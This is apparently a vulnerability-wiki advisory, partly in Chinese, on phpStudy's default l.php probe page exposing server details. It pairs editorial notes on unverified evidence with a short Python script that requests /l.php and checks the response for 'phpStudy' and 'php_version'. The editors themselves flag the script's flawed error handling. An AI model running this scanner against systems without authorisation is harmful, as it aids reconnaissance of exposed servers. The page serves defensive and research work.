---
source: "白阁文库 BaizeSec/bylibrary"
title: "phpstudy敏感信息泄露"
product: "phpStudy diagnostic l.php page"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "Public l.php with identifying fields;versions/default packaging unknown"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-cf775feee8ab3d21385b8a12"
entity_id: "ve-cf775feee8ab3d21385b8a12"
schema_version: "1"
---

# phpstudy敏感信息泄露

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：Public l.php with identifying fields;versions/default packaging unknown
- 证据范围：Response substring heuristic;not same backdoor as70/72

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- No Markdown title/code fence;Python renders as prose
- No description of specific exposed secrets or default-version evidence
- Exceptions incorrectly mean absent;no status validation;main discards returned result
- Classify as diagnostic exposure/configuration rather than universal phpStudy flaw

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpstudy探针
referer: unknown
author: Lucifer
description: phpstudy默认存在探针l.php,泄露敏感信息。
'''
import sys
import requests
import warnings
def run(url):
        result = ['phpstudy探针', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/l.php"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"phpStudy" in req.text and r"php_version" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])


```
---

> 来源：白阁文库 BaizeSec/bylibrary
